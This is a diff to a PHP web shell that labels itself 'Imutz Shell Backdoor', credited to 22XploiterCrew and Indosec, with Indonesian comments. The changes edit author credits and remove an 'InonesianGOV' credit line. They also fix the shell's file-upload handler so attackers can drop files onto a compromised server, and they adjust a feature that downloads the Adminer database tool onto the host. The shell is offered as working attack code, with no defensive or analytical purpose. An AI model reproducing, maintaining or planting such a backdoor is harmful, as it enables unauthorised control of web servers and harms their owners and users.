@@ -3,7 +3,6 @@
 [ Tak semua kami ngotak sendiri ]
 Special thanks for Holiq@Indosec
 Collabs team 22XploiterCrew ft Indosec Coder Team
-[ InonesianGOV ]
 */
 session_start();
 error_reporting(0);
@@ -38,7 +37,7 @@ function login_shell() {
     <meta charset="utf-8">
 		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
 		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
-		<meta name='author' content='CodeXploit@22XploiterCrew'/>
+		<meta name='author' content='CodeXploit|Mr.R4ND5@22XploiterCrew'/>
 		<meta name='author' content='Holiq@Indosec'/>
 		<meta name='copyright' content='22XploiterCrew'/>
 		<meta name='description' content='Imutz Shell Backdoor'>
@@ -490,8 +489,8 @@ echo "
 				</form>";
 		
 			if(isset($_FILES['file'])){
-				if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-					echo '<script>window.location="?dir='.$path.'"; alert("Upload Berhasil");</script>';
+				if(@copy($_FILES['file']['tmp_name'],$dir.'/'.$_FILES['file']['name'])){
+					echo '<script>window.location="?dir='.$dir.'"; alert("Upload Berhasil");</script>';
 				}else{
 					echo '<script>alert("Gagal Upload!!!");</script>';
 				}
@@ -1225,7 +1224,7 @@ echo "
 			flush();
 		}
 		if(file_exists('adminer.php')) {
-			echo "<center><a href='adminer.php' target='_blank'>-> Silahkan Login Adminer <-</a></font></center><br/>";
+			echo "<center><a href='$full/adminer.php' target='_blank'>-> Silahkan Login Adminer <-</a></font></center><br/>";
 		} else {
 			if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
 				echo "<center><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center><br/>";
